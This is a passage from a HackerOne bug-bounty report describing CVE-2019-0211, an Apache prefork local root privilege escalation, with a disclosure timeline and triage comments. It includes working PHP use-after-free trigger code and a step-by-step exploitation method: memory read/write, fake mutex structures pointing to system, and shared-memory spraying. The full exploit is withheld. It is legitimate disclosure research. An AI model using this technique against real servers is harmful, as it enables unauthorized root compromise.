href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L433\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL433\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003eSAFE_ACCEPT(\u0026lt;code\u0026gt;)\u003c/code\u003e will only execute \u003ccode\u003e\u0026lt;code\u0026gt;\u003c/code\u003e if Apache listens \u003cem\u003eon two ports or more\u003c/em\u003e, which is often the case since a server listens over HTTP (80) and HTTPS (443).\u003c/li\u003e\n\u003cli\u003eAssuming \u003ccode\u003e\u0026lt;code\u0026gt;\u003c/code\u003e is executed, \u003ccode\u003eapr_proc_mutex_child_init()\u003c/code\u003e is called, which results in a call to \u003ccode\u003e(*mutex)-\u0026gt;meth-\u0026gt;child_init(mutex, pool, fname)\u003c/code\u003e with mutex under control.\u003c/li\u003e\n\u003cli\u003ePrivileges are dropped a bit later in the execution (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F23167945c17d5764820fdefdcab69295745a15a1%2Fserver%2Fmpm%2Fprefork%2Fprefork.c%23L446\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eL446\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"exploitation\"\u003eExploitation\u003c/h1\u003e\n\n\u003cp\u003eThe exploitation is a four step process:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eObtain R/W access on a worker process\u003c/li\u003e\n\u003cli\u003eWrite a fake \u003ccode\u003eprefork_child_bucket\u003c/code\u003e structure in the SHM\u003c/li\u003e\n\u003cli\u003eMake \u003ccode\u003eall_buckets[bucket]\u003c/code\u003e point to the structure\u003c/li\u003e\n\u003cli\u003eAwait 6:25AM to get an arbitrary function call\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eAdvantages:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe main process never exits, so we know where everything is mapped by reading \u003ccode\u003e/proc/self/maps\u003c/code\u003e (ASLR/PIE useless)\u003c/li\u003e\n\u003cli\u003eWhen a worker dies (or segfaults), it is automatically restarted by the main process, so there is no risk of DOSing Apache\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eProblems:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ePHP does not allow to read/write \u003ccode\u003e/proc/self/mem\u003c/code\u003e, which blocks us from simply editing the SHM\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003eall_buckets\u003c/code\u003e is reallocated after a graceful restart (!)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"1-obtain-r-w-access-on-a-worker-process\"\u003e1. Obtain R/W access on a worker process\u003c/h2\u003e\n\n\u003ch3 id=\"php-uaf-0-day\"\u003ePHP UAF 0-day\u003c/h3\u003e\n\n\u003cp\u003eSince \u003ccode\u003emod_prefork\u003c/code\u003e is often used in combination with \u003ccode\u003emod_php\u003c/code\u003e, it seems natural to exploit the vulnerability through PHP. [CVE-2019-6977]() would be a perfect candidate, but it was not out when I started writing the exploit. I went with a 0day UAF in PHP 7.x (which seems to work in PHP5.x as well):\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003ePHP UAF\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eX\u003c/span\u003e \u003cspan class=\"k\"\u003eextends\u003c/span\u003e \u003cspan class=\"nx\"\u003eDateInterval\u003c/span\u003e \u003cspan class=\"k\"\u003eimplements\u003c/span\u003e \u003cspan class=\"nx\"\u003eJsonSerializable\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003epublic\u003c/span\u003e \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003ejsonSerialize\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eglobal\u003c/span\u003e \u003cspan class=\"nv\"\u003e$y\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003eunset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$y\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003ey\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eget_aslr\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eglobal\u003c/span\u003e \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$y\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"nv\"\u003e$y\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eX\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;PT1S\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)];\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"mi\"\u003e1234\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$y\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;ADDRESS: 0x\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nb\"\u003edechex\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$p\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003eget_aslr\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is an UAF on a PHP object: we unset \u003ccode\u003e$y[0]\u003c/code\u003e (an instance of \u003ccode\u003eX\u003c/code\u003e), but it is still usable using \u003ccode\u003e$this\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"uaf-to-read-write\"\u003eUAF to Read/Write\u003c/h3\u003e\n\n\u003cp\u003eWe want to achieve two things:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eRead memory to find \u003ccode\u003eall_buckets\u003c/code\u003e\u0026#39; address\u003c/li\u003e\n\u003cli\u003eEdit the SHM to change \u003ccode\u003ebucket\u003c/code\u003e index and add our custom mutex structure\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eLuckily for us, PHP\u0026#39;s heap is located before those two in memory.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eMemory addresses of PHP\u0026#39;s heap, `ap_scoreboard_image-\u0026gt;\u003c/em\u003e\u003ccode\u003eand\u003c/code\u003eall_buckets`*\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p\n7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so\n\n(gdb) p *ap_scoreboard_image \n$14 = {\n  global = 0x7f4a9323e008, \n  parent = 0x7f4a9323e020, \n  servers = 0x55835eddea78\n}\n(gdb) p all_buckets \n$15 = (prefork_child_bucket *) 0x7f4a9336b3f0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince we\u0026#39;re triggering the UAF on a PHP object, any property of this object will be UAF\u0026#39;d too; we can convert this \u003ccode\u003ezend_object\u003c/code\u003e UAF into a \u003ccode\u003ezend_string\u003c/code\u003e one.\u003cbr\u003e\nThis is useful because of \u003ccode\u003ezend_string\u003c/code\u003e\u0026#39;s structure:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) ptype zend_string\ntype = struct _zend_string {\n    zend_refcounted_h gc;\n    zend_ulong h;\n    size_t len;\n    char val[1];\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003elen\u003c/code\u003e property contains the length of the string. By incrementing it, we can read and write further in memory, and therefore access the two memory regions we\u0026#39;re interested in: the SHM and Apache\u0026#39;s \u003ccode\u003eall_buckets\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"locating-bucket-indexes-and-all_buckets\"\u003eLocating \u003ccode\u003ebucket\u003c/code\u003e indexes and \u003ccode\u003eall_buckets\u003c/code\u003e\n\u003c/h3\u003e\n\n\u003cp\u003eWe want to change \u003ccode\u003eap_scoreboard_image-\u0026gt;parent[worker_id]-\u0026gt;bucket\u003c/code\u003e for a certain \u003ccode\u003eworker_id\u003c/code\u003e. Luckily, the structure always starts at the beginning of the shared memory block, so it is easy to locate.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eShared memory location and targeted process_score structures\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@apaubuntu:~# cat /proc/6318/maps | grep rw-s\n7f4a9323e000-7f4a93252000 rw-s 00000000 00:05 57052                      /dev/zero (deleted)\n\n(gdb) p \u0026amp;ap_scoreboard_image-\u0026gt;parent[0]\n$18 = (process_score *) 0x7f4a9323e020\n(gdb) p \u0026amp;ap_scoreboard_image-\u0026gt;parent[1]\n$19 = (process_score *) 0x7f4a9323e044\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo locate \u003ccode\u003eall_buckets\u003c/code\u003e, we can make use of our knowledge of the \u003ccode\u003eprefork_child_bucket\u003c/code\u003e structure. We have:\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eImportant structures of bucket items\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eprefork_child_bucket {\n    ap_pod_t *pod;\n    ap_listen_rec *listeners;\n    apr_proc_mutex_t *mutex; \u0026lt;--\n}\n\napr_proc_mutex_t {\n    apr_pool_t *pool;\n    const apr_proc_mutex_unix_lock_methods_t *meth; \u0026lt;--\n    int curr_locked;\n    char *fname;\n\n    ...\n}\n\napr_proc_mutex_unix_lock_methods_t {\n    unsigned int flags;\n    apr_status_t (*create)(apr_proc_mutex_t *, const char *);\n    apr_status_t (*acquire)(apr_proc_mutex_t *);\n    apr_status_t (*tryacquire)(apr_proc_mutex_t *);\n    apr_status_t (*release)(apr_proc_mutex_t *);\n    apr_status_t (*cleanup)(void *);\n    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); \u0026lt;--\n    apr_status_t (*perms_set)(apr_proc_mutex_t *, apr_fileperms_t, apr_uid_t, apr_gid_t);\n    apr_lockmech_e mech;\n    const char *name;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003eall_buckets[0]-\u0026gt;mutex\u003c/code\u003e will be located in the same memory region as \u003ccode\u003eall_buckets[0]\u003c/code\u003e. Since \u003ccode\u003emeth\u003c/code\u003e is a static structure, it will be located in \u003ccode\u003elibapr\u003c/code\u003e\u0026#39;s \u003ccode\u003e.data\u003c/code\u003e. Since \u003ccode\u003emeth\u003c/code\u003e points to functions defined in \u003ccode\u003elibapr\u003c/code\u003e, each of the function pointers will be located in \u003ccode\u003elibapr\u003c/code\u003e\u0026#39;s \u003ccode\u003e.text\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eSince we have knowledge of those region\u0026#39;s addresses through \u003ccode\u003e/proc/self/maps\u003c/code\u003e, we can go through every pointer in Apache\u0026#39;s memory and find one that matches the structure. It will be \u003ccode\u003eall_buckets[0]\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eAs I mentioned, \u003ccode\u003eall_buckets\u003c/code\u003e\u0026#39;s address changes at every graceful restart. This means that when our exploit triggers, \u003ccode\u003eall_buckets\u003c/code\u003e\u0026#39;s address will be different than the one we found. This has to be taken into account; we\u0026#39;ll talk about this later.\u003c/p\u003e\n\n\u003ch2 id=\"2-write-a-fake-prefork_child_bucket-structure-in-the-shm\"\u003e2. Write a fake \u003ccode\u003eprefork_child_bucket\u003c/code\u003e structure in the SHM\u003c/h2\u003e\n\n\u003ch3 id=\"reaching-the-function-call\"\u003eReaching the function call\u003c/h3\u003e\n\n\u003cp\u003eThe code path to the arbitrary function call is the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebucket_id = ap_scoreboard_image-\u0026gt;parent[id]-\u0026gt;bucket\nmy_bucket = all_buckets[bucket_id]\nmutex = \u0026amp;my_bucket-\u0026gt;mutex\napr_proc_mutex_child_init(mutex)\n(*mutex)-\u0026gt;meth-\u0026gt;child_init(mutex, pool, fname)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e![Call:reach](images/carpe-diem-cve-2019-0211-apache-local-root/1.png)\u003c/p\u003e\n\n\u003ch3 id=\"calling-something-proper\"\u003eCalling something proper\u003c/h3\u003e\n\n\u003cp\u003eTo exploit, we make \u003ccode\u003e(*mutex)-\u0026gt;meth-\u0026gt;child_init\u003c/code\u003e point to \u003ccode\u003ezend_object_std_dtor(zend_object *object)\u003c/code\u003e, which yields the following chain:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emutex = \u0026amp;my_bucket-\u0026gt;mutex\n[object = mutex]\nzend_object_std_dtor(object)\nht = object-\u0026gt;properties\nzend_array_destroy(ht)\nzend_hash_destroy(ht)\nval = \u0026amp;ht-\u0026gt;arData[0]-\u0026gt;val\nht-\u0026gt;pDestructor(val)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003epDestructor\u003c/code\u003e is set to \u003ccode\u003esystem\u003c/code\u003e, and \u003ccode\u003e\u0026amp;ht-\u0026gt;arData[0]-\u0026gt;val\u003c/code\u003e is a string.\u003c/p\u003e\n\n\u003cp\u003e![Call:exec](images/carpe-diem-cve-2019-0211-apache-local-root/2.png)\u003c/p\u003e\n\n\u003cp\u003eAs you can see, both leftmost structures are superimposed.\u003c/p\u003e\n\n\u003ch2 id=\"3-make-all_buckets-bucket-point-to-the-structure\"\u003e3. Make \u003ccode\u003eall_buckets[bucket]\u003c/code\u003e point to the structure\u003c/h2\u003e\n\n\u003ch3 id=\"problem-and-solution\"\u003eProblem and solution\u003c/h3\u003e\n\n\u003cp\u003eRight now, if \u003ccode\u003eall_buckets\u003c/code\u003e\u0026#39; address was unchanged in between restarts, our exploit would be over:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eGet R/W over all memory after PHP\u0026#39;s heap\u003c/li\u003e\n\u003cli\u003eFind \u003ccode\u003eall_buckets\u003c/code\u003e by matching its structure\u003c/li\u003e\n\u003cli\u003ePut our structure in the SHM\u003c/li\u003e\n\u003cli\u003eChange one of the \u003ccode\u003eprocess_score.bucket\u003c/code\u003e in the SHM so that \u003ccode\u003eall_bucket[bucket]-\u0026gt;mutex\u003c/code\u003e points to our payload\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAs \u003ccode\u003eall_buckets\u003c/code\u003e\u0026#39; address changes, we can do two things to improve reliability: spray the SHM and use every \u003ccode\u003eprocess_score\u003c/code\u003e structure - one for each PID.\u003c/p\u003e\n\n\u003ch3 id=\"spraying-the-shared-memory\"\u003eSpraying the shared memory\u003c/h3\u003e\n\n\u003cp\u003eIf \u003ccode\u003eall_buckets\u003c/code\u003e\u0026#39; new address is not far from the old one, \u003ccode\u003emy_bucket\u003c/code\u003e will point close to our structure. Therefore, instead of having our \u003ccode\u003eprefork_child_bucket\u003c/code\u003e structure at a precise point in the SHM, we can spray it all over unused parts of the SHM. The problem is that the\u003cbr\u003e\nstructure is also used as a \u003ccode\u003ezend_object\u003c/code\u003e, and therefore it has a size of (5 * 8 =) 40 bytes to include \u003ccode\u003ezend_object.properties\u003c/code\u003e.\u003cbr\u003e\nSpraying a structure that big over a space this small won\u0026#39;t help us much.\u003cbr\u003e\nTo solve this problem, we superimpose the two center structures, \u003ccode\u003eapr_proc_mutex_t\u003c/code\u003e and \u003ccode\u003ezend_array\u003c/code\u003e, and spray their address in the rest of the shared memory.\u003cbr\u003e\nThe impact will be that \u003ccode\u003eprefork_child_bucket.mutex\u003c/code\u003e and \u003ccode\u003ezend_object.properties\u003c/code\u003e point to the same address.\u003cbr\u003e\nNow, if \u003ccode\u003eall_bucket\u003c/code\u003e is relocated not too far from its original address, \u003ccode\u003emy_bucket\u003c/code\u003e will be in the sprayed area.\u003c/p\u003e\n\n\u003cp\u003e![Call:exec](images/carpe-diem-cve-2019-0211-apache-local-root/3.png)\u003c/p\u003e\n\n\u003ch3 id=\"using-every-process_score\"\u003eUsing every \u003ccode\u003eprocess_score\u003c/code\u003e\n\u003c/h3\u003e\n\n\u003cp\u003eEach Apache worker has an associated \u003ccode\u003eprocess_score\u003c/code\u003e structure, and with it a \u003ccode\u003ebucket\u003c/code\u003e index.\u003cbr\u003e\nInstead of changing one \u003ccode\u003eprocess_score.bucket\u003c/code\u003e value, we can change every one of them, so that they cover another part of memory. For instance:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eap_scoreboard_image-\u0026gt;parent[0]-\u0026gt;bucket = -10000 -\u0026gt; 0x7faabbcc00 \u0026lt;= all_buckets \u0026lt;= 0x7faabbdd00\nap_scoreboard_image-\u0026gt;parent[1]-\u0026gt;bucket = -20000 -\u0026gt; 0x7faabbdd00 \u0026lt;= all_buckets \u0026lt;= 0x7faabbff00\nap_scoreboard_image-\u0026gt;parent[2]-\u0026gt;bucket = -30000 -\u0026gt; 0x7faabbff00 \u0026lt;= all_buckets \u0026lt;= 0x7faabc0000\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis multiplies our success rate by the number of apache workers. Upon respawn, only one worker have a valid \u003ccode\u003ebucket\u003c/code\u003e number, but this is not a problem because the others will crash, and immediately respawn.\u003c/p\u003e\n\n\u003ch3 id=\"success-rate\"\u003eSuccess rate\u003c/h3\u003e\n\n\u003cp\u003eDifferent Apache servers have different number of workers. Having more workers mean we can spray the address of our mutex over less memory, but it also means we can specify more \u003ccode\u003eindex\u003c/code\u003e for \u003ccode\u003eall_buckets\u003c/code\u003e. This means that having more workers improves our success rate. After a few tries on my test Apache server of 4 workers (default), I had \u003cstrong\u003e~80% success rate\u003c/strong\u003e.\u003c/p\u003e\n\n\u003cp\u003eAgain, if the exploit fails, it can be restarted the next day as Apache will still restart properly. Apache\u0026#39;s \u003ccode\u003eerror.log\u003c/code\u003e will nevertheless contain notifications about its workers segfaulting.\u003c/p\u003e\n\n\u003ch2 id=\"4-await-6-25am-for-the-exploit-to-trigger\"\u003e4. Await 6:25AM for the exploit to trigger\u003c/h2\u003e\n\n\u003cp\u003eWell, that\u0026#39;s the easy step.\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability-timeline\"\u003eVulnerability timeline\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e2019-02-22 Initial contact email to \u003ccode\u003esecurity[at]apache[dot]org\u003c/code\u003e, with description and POC\u003c/li\u003e\n\u003cli\u003e2019-02-25 Acknowledgment of the vulnerability, working on a fix\u003c/li\u003e\n\u003cli\u003e2019-03-07 Apache\u0026#39;s security team sends a patch for I to review, CVE assigned\u003c/li\u003e\n\u003cli\u003e2019-03-10 I approve the patch\u003c/li\u003e\n\u003cli\u003e2019-04-01 Apache HTTP version 2.4.39 released\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eApache\u0026#39;s team has been prompt to respond and patch, and nice as hell. Really good experience. PHP never answered regarding the UAF.\u003c/p\u003e\n\n\u003ch1 id=\"exploit\"\u003eExploit\u003c/h1\u003e\n\n\u003cp\u003eI\u0026#39;m not releasing it just yet !\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eYou generally obtain root privileges from www-data privileges.\u003c/p\u003e\n","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-10-10T20:32:52.463Z","allow_singular_disclosure_after":-38482902.304881975,"singular_disclosure_allowed":true,"vote_count":117,"voters":["sn0wd3n","rioru","m0chan","bl4de","un4gi","bsysop","sameerphad72","mygf","leonishan","kieran","and 107 more..."],"severity":{"rating":"high","score":7.8,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4474297,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-04T13:18:19.145Z","updated_at":"2019-04-04T13:18:19.145Z","cve_ids":["CVE-2019-0211"],"actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4474493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @real,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@antenna ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/real\"\u003e@real\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/antenna\"\u003e@antenna\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-04T13:44:24.333Z","updated_at":"2019-04-04T13:44:24.333Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4474521,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-04T13:49:33.687Z","updated_at":"2019-04-04T13:49:33.687Z","additional_data":{"old_title":"Apache HTTP local root","new_title":"Apache HTTP [2.4.17-2.4.38] Local Root Privilege Escalation"},"actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4474524,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-04T13:50:11.708Z","updated_at":"2019-04-04T13:50:11.708Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4474544,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @real,\n\nThank you for your submission! I was able to validate the CVE finding exists and is resolved on Apache's side. I have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report. Please note that the status and severity are subject to change.\n\nRegards,\n@antenna ","markdown_message":"\u003cp\u003eHello \u003ca href=\"/real\"\u003e@real\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! I was able to validate the CVE finding exists and is resolved on Apache\u0026#39;s side. I have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/antenna\"\u003e@antenna\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-04T13:52:15.814Z","updated_at":"2019-04-04T13:52:15.814Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4825324,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello !\n\nAny update on this ? :)\n\nRegards,\nCharles","markdown_message":"\u003cp\u003eHello !\u003c/p\u003e\n\n\u003cp\u003eAny update on this ? :)\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nCharles\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-13T09:24:50.197Z","updated_at":"2019-05-13T09:24:50.197Z","actor":{"username":"real","cleared":false,"url":"/real","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5774467,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-10T20:32:03.331Z","updated_at":"2019-09-10T20:32:03.331Z","actor":{"url":"/ibb-apache","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/026/1019d58a547964cedd75cda5809332316a7e381c_original.png/eb31823a4cc9f6b6bb4db930ffdf5125